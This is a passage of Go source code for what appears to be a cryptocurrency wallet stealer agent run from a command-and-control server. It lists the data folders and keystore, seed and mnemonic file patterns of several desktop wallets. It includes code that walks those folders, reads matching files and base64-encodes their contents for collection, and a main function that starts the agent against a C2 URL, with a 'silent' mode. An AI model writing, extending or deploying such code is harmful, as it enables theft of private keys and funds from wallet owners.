			ProcessNames: []string{"Ethereum Wallet.exe"},
			DataDirectories: []string{
				appData + "\\Ethereum\\keystore",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.json", "keystore\\*"},
			KeystoreFiles: []string{"keystore\\*", "*.keystore", "UTC--*"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"MyEtherWallet": {
			WalletType: "Ethereum",
			InstallPaths: []string{
				localAppData + "\\Programs\\MyEtherWallet\\MyEtherWallet.exe",
			},
			ProcessNames: []string{"MyEtherWallet.exe"},
			DataDirectories: []string{
				appData + "\\MyEtherWallet",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.json", "*.wallet"},
			KeystoreFiles: []string{"*.keystore", "keystore\\*", "UTC--*"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Jaxx Liberty": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\Jaxx Liberty\\Jaxx Liberty.exe",
			},
			ProcessNames: []string{"Jaxx Liberty.exe"},
			DataDirectories: []string{
				appData + "\\com.liberty.jaxx",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.wallet", "*.dat", "*.json"},
			KeystoreFiles: []string{"*.keystore"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Coinomi": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\Coinomi\\Coinomi.exe",
			},
			ProcessNames: []string{"Coinomi.exe"},
			DataDirectories: []string{
				appData + "\\Coinomi",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.wallet", "*.dat", "*.json"},
			KeystoreFiles: []string{"*.keystore"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Trust Wallet": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\Trust Wallet\\Trust Wallet.exe",
			},
			ProcessNames: []string{"Trust Wallet.exe"},
			DataDirectories: []string{
				appData + "\\Trust Wallet",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.wallet", "*.dat", "*.json"},
			KeystoreFiles: []string{"*.keystore"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Phantom": {
			WalletType: "Solana",
			InstallPaths: []string{
				localAppData + "\\Programs\\Phantom\\Phantom.exe",
			},
			ProcessNames: []string{"Phantom.exe"},
			DataDirectories: []string{
				appData + "\\Phantom",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.wallet", "*.json"},
			KeystoreFiles: []string{"*.keystore", "*.key"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Solflare": {
			WalletType: "Solana",
			InstallPaths: []string{
				localAppData + "\\Programs\\Solflare\\Solflare.exe",
			},
			ProcessNames: []string{"Solflare.exe"},
			DataDirectories: []string{
				appData + "\\Solflare",
			},
			ConfigFiles:   []string{},
			WalletFiles:   []string{"*.wallet", "*.json"},
			KeystoreFiles: []string{"*.keystore"},
			BackupFiles:   []string{"*.backup", "*.seed", "*.mnemonic"},
			LogFiles:      []string{},
		},
		"Guarda": {
			WalletType: "Multi-Currency",
			InstallPaths: []string{
				localAppData + "\\Programs\\Guarda\\Guarda.exe",
			},
			ProcessNames: []string{"Guarda.exe"},
			DataDirectories: []string{
				appData + "\\Guarda",
			},
			ConfigFiles:   []string{"*.json", "*.conf", "*.ini", "config.json"},
			WalletFiles:   []string{"*.wallet", "*.dat", "*.json", "*.db", "*.sqlite", "*.ldb", "*.log", "CURRENT", "LOCK", "LOG*", "MANIFEST*"},
			KeystoreFiles: []string{"*.keystore", "keystore\\*", "*.key"},
			BackupFiles:   []string{"*.backup", "backup\\*", "*.seed", "*.mnemonic"},
			LogFiles:      []string{"*.log", "*.txt"},
		},
	}
}

// isProcessRunning checks if a process is currently running and returns its PID
func (a *Agent) isProcessRunning(processName string) int {
	if runtime.GOOS != "windows" {
		return 0
	}

	cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s", processName), "/FO", "CSV", "/NH")
	output, err := cmd.Output()
	if err != nil {
		return 0
	}

	lines := strings.Split(string(output), "\n")
	for _, line := range lines {
		if strings.Contains(line, processName) {
			// Parse CSV to get PID (second column)
			parts := strings.Split(line, ",")
			if len(parts) >= 2 {
				pidStr := strings.Trim(parts[1], "\"")
				if pid, err := fmt.Sscanf(pidStr, "%d", new(int)); err == nil && pid == 1 {
					var actualPid int
					fmt.Sscanf(pidStr, "%d", &actualPid)
					return actualPid
				}
			}
		}
	}
	return 0
}

// scanWalletFiles scans a directory for specific wallet files and returns file information
func (a *Agent) scanWalletFiles(baseDir string, patterns []string, walletName, fileType string) []config.HotWalletFile {
	var files []config.HotWalletFile

	// If no patterns specified, scan everything
	if len(patterns) == 0 {
		patterns = []string{"*"}
	}

	log.Printf("Scanning %s for %s files in: %s", walletName, fileType, baseDir)

	// Walk the entire directory tree
	err := filepath.Walk(baseDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Continue on errors
		}

		// Skip directories
		if info.IsDir() {
			return nil
		}

		// Check if file matches any pattern
		fileName := filepath.Base(path)
		matchesPattern := false

		for _, pattern := range patterns {
			// Handle simple patterns
			if pattern == "*" || pattern == "*.*" {
				matchesPattern = true
				break
			}

			// Handle extension patterns like *.ldb
			if strings.HasPrefix(pattern, "*.") {
				ext := pattern[1:] // Remove the *
				if strings.HasSuffix(strings.ToLower(fileName), strings.ToLower(ext)) {
					matchesPattern = true
					break
				}
			} else if strings.Contains(pattern, "*") {
				// Handle glob patterns
				if matched, _ := filepath.Match(strings.ToLower(pattern), strings.ToLower(fileName)); matched {
					matchesPattern = true
					break
				}
			} else {
				// Exact match
				if strings.EqualFold(fileName, pattern) {
					matchesPattern = true
					break
				}
			}
		}

		if !matchesPattern {
			return nil
		}

		// Skip files that are too large (>50MB) or too small (<10 bytes)
		if info.Size() > 50*1024*1024 || info.Size() < 10 {
			return nil
		}

		log.Printf("Found %s file: %s (%.2f KB)", fileType, path, float64(info.Size())/1024)

		// Read file content for smaller files (< 1MB)
		var fileContent string
		var isEncrypted bool

		if info.Size() < 1024*1024 {
			if content, err := os.ReadFile(path); err == nil {
				// Check if file appears to be encrypted/binary
				isEncrypted = a.isFileEncrypted(content)

				// Always store the content as base64 for wallet files
				fileContent = base64.StdEncoding.EncodeToString(content)
			}
		}

		walletFile := config.HotWalletFile{
			WalletName:   walletName,
			WalletType:   fileType,
			FilePath:     path,
			FileName:     fileName,
			FileSize:     info.Size(),
			FileContent:  fileContent,
			IsEncrypted:  isEncrypted,
			Description:  a.getFileDescription(path, fileType),
			LastModified: info.ModTime().Unix(),
		}

		files = append(files, walletFile)
		return nil
	})

	if err != nil {
		log.Printf("Error scanning %s: %v", baseDir, err)
	}

	log.Printf("Found %d %s files for %s", len(files), fileType, walletName)
	return files
}

// isFileEncrypted checks if a file appears to be encrypted or binary
func (a *Agent) isFileEncrypted(content []byte) bool {
	if len(content) == 0 {
		return false
	}

	// Check for common encrypted file signatures
	encryptedSignatures := [][]byte{
		{0x53, 0x61, 0x6C, 0x74, 0x65, 0x64, 0x5F, 0x5F}, // "Salted__" (OpenSSL)
		{0x50, 0x4B, 0x03, 0x04},                         // ZIP/encrypted archive
		{0x7B, 0x22, 0x65, 0x6E, 0x63, 0x72, 0x79, 0x70}, // JSON with "encrypt"
	}

	for _, sig := range encryptedSignatures {
		if len(content) >= len(sig) && bytes.Equal(content[:len(sig)], sig) {
			return true
		}
	}

	// Check for high entropy (likely encrypted)
	if len(content) > 100 {
		entropy := a.calculateEntropy(content[:100])
		if entropy > 7.5 { // High entropy suggests encryption
			return true
		}
	}

	// Check for binary content
	nullBytes := 0
	for i := 0; i < len(content) && i < 1000; i++ {
		if content[i] == 0 {
			nullBytes++
		}
	}

	// If more than 5% null bytes, likely binary/encrypted
	if float64(nullBytes)/float64(len(content)) > 0.05 {
		return true
	}

	return false
}

// calculateEntropy calculates Shannon entropy of data
func (a *Agent) calculateEntropy(data []byte) float64 {
	if len(data) == 0 {
		return 0
	}

	// Count frequency of each byte
	freq := make(map[byte]int)
	for _, b := range data {
		freq[b]++
	}

	// Calculate entropy
	entropy := 0.0
	length := float64(len(data))

	for _, count := range freq {
		if count > 0 {
			p := float64(count) / length
			entropy -= p * (math.Log2(p))
		}
	}

	return entropy
}

// getFileDescription provides a description of the wallet file type
func (a *Agent) getFileDescription(filePath, fileType string) string {
	fileName := strings.ToLower(filepath.Base(filePath))
	ext := strings.ToLower(filepath.Ext(filePath))

	switch {
	case strings.Contains(fileName, "wallet.dat"):
		return "Core wallet data file"
	case strings.Contains(fileName, "seed"):
		return "Seed phrase backup"
	case strings.Contains(fileName, "keystore"):
		return "Private key storage"
	case strings.Contains(fileName, "config"):
		return "Wallet configuration"
	case strings.Contains(fileName, "backup"):
		return "Wallet backup file"
	case ext == ".keys":
		return "Private keys file"
	case ext == ".wallet":
		return "Wallet data file"
	case ext == ".dat":
		return "Wallet database file"
	case ext == ".json":
		return "JSON wallet/config file"
	case ext == ".conf":
		return "Configuration file"
	case ext == ".log":
		return "Wallet log file"
	case ext == ".aes":
		return "AES encrypted wallet"
	case ext == ".seco":
		return "Secure encrypted file"
	default:
		return fmt.Sprintf("%s file", strings.Title(fileType))
	}
}

// Helper functions for credential extraction

func main() {
	// Disable logging in production
	if len(os.Args) > 1 && os.Args[1] == "silent" {
		log.SetOutput(os.Stderr)
	}

	rand.Seed(time.Now().UnixNano())

	c2URL := config.C2_BASE_URL
	if len(os.Args) > 1 && !strings.HasPrefix(os.Args[1], "silent") {
		c2URL = os.Args[1]
	}

	agent := NewAgent(c2URL)
	agent.Start()
}
